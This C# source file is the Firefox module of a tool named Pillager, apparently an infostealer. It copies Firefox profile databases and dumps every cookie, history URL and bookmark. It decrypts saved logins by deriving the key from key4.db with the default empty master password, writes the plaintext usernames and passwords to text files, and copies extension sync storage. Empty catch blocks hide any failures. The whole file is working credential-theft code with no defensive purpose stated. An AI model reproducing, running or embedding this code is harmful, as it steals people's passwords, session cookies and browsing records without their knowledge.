using Pillager.Helper;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace Pillager.Browsers
{
    internal class FireFox: ICommand
    {
        public string BrowserPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Mozilla\\Firefox\\Profiles");

        public string masterPassword = "";

        public string FireFox_cookies()
        {
            StringBuilder cookies = new StringBuilder();
            foreach (var directory in Directory.GetDirectories(BrowserPath))
            {
                string firefox_cookie_path = Path.Combine(directory, "cookies.sqlite");
                if (File.Exists(firefox_cookie_path))
                {
                    try
                    {
                        string cookie_tempFile = Path.GetTempFileName();
                        File.Copy(firefox_cookie_path, cookie_tempFile, true);
                        SQLiteHandler handler = new SQLiteHandler(cookie_tempFile);
                        if (!handler.ReadTable("moz_cookies"))
                            return null;
                        for (int i = 0; i < handler.GetRowCount(); i++)
                        {
                            string host_key = handler.GetValue(i, "host");
                            string name = handler.GetValue(i, "name");
                            string cookie = handler.GetValue(i, "value");
                            cookies.AppendLine("[" + host_key + "] \t {" + name + "}={" + cookie + "}");
                        }
                        File.Delete(cookie_tempFile);
                    }
                    catch { }
                }
            }            

            return cookies.ToString();
        }

        public string FireFox_history()
        {
            StringBuilder history = new StringBuilder();
            foreach (var directory in Directory.GetDirectories(BrowserPath))
            {
                string firefox_history_path = Path.Combine(directory, "places.sqlite");
                if (File.Exists(firefox_history_path))
                {
                    try
                    {
                        string history_tempFile = Path.GetTempFileName();
                        File.Copy(firefox_history_path, history_tempFile, true);
                        SQLiteHandler handler = new SQLiteHandler(history_tempFile);
                        if (!handler.ReadTable("moz_places")) return null;
                        for (int i = 0; i < handler.GetRowCount(); i++)
                        {
                            string url = handler.GetValue(i, "url");
                            history.AppendLine(url);
                        }
                        File.Delete(history_tempFile);
                    }
                    catch { }
                }
            }
            
            return history.ToString();
        }

        public string FireFox_books()
        {
            StringBuilder books = new StringBuilder();
            foreach (var directory in Directory.GetDirectories(BrowserPath))
            {
                string firefox_books_path = Path.Combine(directory, "places.sqlite");
                if (File.Exists(firefox_books_path))
                {
                    try
                    {
                        string books_tempFile = Path.GetTempFileName();
                        File.Copy(firefox_books_path, books_tempFile, true);
                        SQLiteHandler handler = new SQLiteHandler(books_tempFile);
                        if (!handler.ReadTable("moz_bookmarks")) return null;
                        List<string> fks = new List<string>();
                        for (int i = 0; i < handler.GetRowCount(); i++)
                        {
                            var fk = handler.GetValue(i, "fk");
                            if (fk != "0")
                            {
                                fks.Add(fk);
                            }
                        }
                        handler = new SQLiteHandler(books_tempFile);
                        if (!handler.ReadTable("moz_places")) return null;
                        for (int i = 0; i < handler.GetRowCount(); i++)
                        {
                            var id = handler.GetRawID(i);
                            if (fks.Contains(id.ToString()))
                            {
                                books.AppendLine(handler.GetValue(i, "url"));
                            }
                        }
                        File.Delete(books_tempFile);
                    }
                    catch { }
                }
            }
            
            return books.ToString();
        }

        public string FireFox_passwords()
        {
            StringBuilder password = new StringBuilder();
            foreach (var directory in Directory.GetDirectories(BrowserPath))
            {
                string loginsJsonPath = Path.Combine(directory, "logins.json");
                string keyDBPath = Path.Combine(directory, "key4.db");
                if (File.Exists(loginsJsonPath) && File.Exists(keyDBPath))
                {
                    try
                    {
                        string password_keyDB_tempFile = Path.GetTempFileName();
                        File.Copy(keyDBPath, password_keyDB_tempFile, true);
                        string password_loginsJson_tempFile = Path.GetTempFileName();
                        File.Copy(loginsJsonPath, password_loginsJson_tempFile, true);
                        SQLiteHandler handler = new SQLiteHandler(password_keyDB_tempFile);
                        if (!handler.ReadTable("metadata")) return null;
                        Asn1Der asn = new Asn1Der();
                        for (int i = 0; i < handler.GetRowCount(); i++)
                        {
                            if (handler.GetValue(i, "id") != "password") continue;
                            byte[] item2Byte;
                            var globalSalt = Convert.FromBase64String(handler.GetValue(i, "item1"));
                            try
                            {
                                item2Byte = Convert.FromBase64String(handler.GetValue(i, "item2"));
                            }
                            catch
                            {
                                item2Byte = Convert.FromBase64String(handler.GetValue(i, "item2)"));
                            }
                            Asn1DerObject item2 = asn.Parse(item2Byte);
                            string asnString = item2.ToString();
                            if (asnString.Contains("2A864886F70D010C050103"))
                            {
                                var entrySalt = item2.objects[0].objects[0].objects[1].objects[0].Data;
                                var cipherText = item2.objects[0].objects[1].Data;
                                decryptMoz3DES CheckPwd = new decryptMoz3DES(cipherText, globalSalt, Encoding.ASCII.GetBytes(masterPassword), entrySalt);
                                var passwordCheck = CheckPwd.Compute();
                                string decryptedPwdChk = Encoding.GetEncoding("ISO-8859-1").GetString(passwordCheck);
                                if (!decryptedPwdChk.StartsWith("password-check")) return null;
                            }
                            else if (asnString.Contains("2A864886F70D01050D"))
                            {
                                var entrySalt = item2.objects[0].objects[0].objects[1].objects[0].objects[1].objects[0].Data;
                                var partIV = item2.objects[0].objects[0].objects[1].objects[2].objects[1].Data;
                                var cipherText = item2.objects[0].objects[0].objects[1].objects[3].Data;
                                MozillaPBE CheckPwd = new MozillaPBE(cipherText, globalSalt, Encoding.ASCII.GetBytes(masterPassword), entrySalt, partIV);
                                var passwordCheck = CheckPwd.Compute();
                                string decryptedPwdChk = Encoding.GetEncoding("ISO-8859-1").GetString(passwordCheck);
                                if (!decryptedPwdChk.StartsWith("password-check")) return null;
                            }
                            else return null;
                            try
                            {
                                handler = new SQLiteHandler(password_keyDB_tempFile);
                                if (!handler.ReadTable("nssPrivate")) return null;
                                for (int j = 0; j < handler.GetRowCount(); j++)
                                {
                                    var a11Byte = Convert.FromBase64String(handler.GetValue(j, "a11"));
                                    Asn1DerObject a11ASNValue = asn.Parse(a11Byte);
                                    var keyEntrySalt = a11ASNValue.objects[0].objects[0].objects[1].objects[0].objects[1].objects[0].Data;
                                    var keyPartIV = a11ASNValue.objects[0].objects[0].objects[1].objects[2].objects[1].Data;
                                    var keyCipherText = a11ASNValue.objects[0].objects[0].objects[1].objects[3].Data;
                                    MozillaPBE PrivKey = new MozillaPBE(keyCipherText, globalSalt, Encoding.ASCII.GetBytes(masterPassword), keyEntrySalt, keyPartIV);
                                    var fullprivateKey = PrivKey.Compute();
                                    byte[] privateKey = new byte[24];
                                    Array.Copy(fullprivateKey, privateKey, privateKey.Length);
                                    password.Append(decryptLogins(loginsJsonPath, privateKey));
                                }
                            }
                            catch { }
                        }
                        File.Delete(password_keyDB_tempFile);
                        File.Delete(password_loginsJson_tempFile);
                    }
                    catch { }
                }
            }
            
            return password.ToString();
        }

        public string decryptLogins(string loginsJsonPath, byte[] privateKey)
        {
            StringBuilder sb = new StringBuilder();
            Asn1Der asn = new Asn1Der();
            Login[] logins = ParseLoginFile(loginsJsonPath);
            if (logins.Length == 0) return null;
            foreach (Login login in logins)
            {
                Asn1DerObject user = asn.Parse(Convert.FromBase64String(login.encryptedUsername));
                Asn1DerObject pwd = asn.Parse(Convert.FromBase64String(login.encryptedPassword));
                string hostname = login.hostname;
                string decryptedUser = TripleDESHelper.DESCBCDecryptor(privateKey, user.objects[0].objects[1].objects[1].Data, user.objects[0].objects[2].Data);
                string decryptedPwd = TripleDESHelper.DESCBCDecryptor(privateKey, pwd.objects[0].objects[1].objects[1].Data, pwd.objects[0].objects[2].Data);
                sb.Append("\t[URL] -> {" + hostname + "}\n\t[USERNAME] -> {" + Regex.Replace(decryptedUser, @"[^\u0020-\u007F]", "") + "}\n\t[PASSWORD] -> {" + Regex.Replace(decryptedPwd, @"[^\u0020-\u007F]", "") + "}\n");
                sb.AppendLine();
            }
            return sb.ToString();
        }

        public Login[] ParseLoginFile(string path)
        {
            string rawText = File.ReadAllText(path);
            int openBracketIndex = rawText.IndexOf('[');
            int closeBracketIndex = rawText.IndexOf("],");
            string loginArrayText = rawText.Substring(openBracketIndex + 1, closeBracketIndex - (openBracketIndex + 1));
            return ParseLoginItems(loginArrayText);
        }

        public Login[] ParseLoginItems(string loginJSON)
        {
            int openBracketIndex = loginJSON.IndexOf('{');
            List<Login> logins = new List<Login>();
            string[] intParams = new string[] { "id", "encType", "timesUsed" };
            string[] longParams = new string[] { "timeCreated", "timeLastUsed", "timePasswordChanged" };
            while (openBracketIndex != -1)
            {
                int encTypeIndex = loginJSON.IndexOf("encType", openBracketIndex);
                int closeBracketIndex = loginJSON.IndexOf('}', encTypeIndex);
                Login login = new Login();
                string bracketContent = "";
                for (int i = openBracketIndex + 1; i < closeBracketIndex; i++)
                {
                    bracketContent += loginJSON[i];
                }
                bracketContent = bracketContent.Replace("\"", "");
                string[] keyValuePairs = bracketContent.Split(',');
                foreach (string keyValueStr in keyValuePairs)
                {
                    string[] keyValue = keyValueStr.Split(new[] { ':' }, 2);
                    string key = keyValue[0];
                    string val = keyValue[1];
                    if (val == "null")
                    {
                        login.GetType().GetProperty(key).SetValue(login, null, null);
                    }
                    if (Array.IndexOf(intParams, key) > -1)
                    {
                        login.GetType().GetProperty(key).SetValue(login, int.Parse(val), null);
                    }
                    else if (Array.IndexOf(longParams, key) > -1)
                    {
                        login.GetType().GetProperty(key).SetValue(login, long.Parse(val), null);
                    }
                    else
                    {
                        login.GetType().GetProperty(key).SetValue(login, val, null);
                    }
                }
                logins.Add(login);
                openBracketIndex = loginJSON.IndexOf('{', closeBracketIndex);
            }
            return logins.ToArray();
        }
        public override void Save(string path)
        {
            try
            {
                if (!Directory.Exists(BrowserPath)) return;
                string savepath = Path.Combine(path, "FireFox");
                Directory.CreateDirectory(savepath);
                string cookies = FireFox_cookies();
                string history = FireFox_history();
                string books = FireFox_books();
                string passwords = FireFox_passwords();
                if (!String.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, "FireFox_cookies.txt"), cookies, Encoding.UTF8);
                if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, "FireFox_history.txt"), history, Encoding.UTF8);
                if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, "FireFox_books.txt"), books, Encoding.UTF8);
                if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, "FireFox_passwords.txt"), passwords, Encoding.UTF8);
                foreach (var directory in Directory.GetDirectories(BrowserPath))
                {
                    if (File.Exists(Path.Combine(directory, "storage-sync-v2.sqlite")))
                    {
                        File.Copy(Path.Combine(directory, "storage-sync-v2.sqlite"), Path.Combine(savepath, "storage-sync-v2.sqlite"));
                        if (File.Exists(Path.Combine(directory, "storage-sync-v2.sqlite-shm")))
                            File.Copy(Path.Combine(directory, "storage-sync-v2.sqlite-shm"), Path.Combine(savepath, "storage-sync-v2.sqlite-shm"));
                        if (File.Exists(Path.Combine(directory, "storage-sync-v2.sqlite-wal")))
                            File.Copy(Path.Combine(directory, "storage-sync-v2.sqlite-wal"), Path.Combine(savepath, "storage-sync-v2.sqlite-wal"));
                        break;
                    }
                }
            }
            catch { }
        }
    }
}
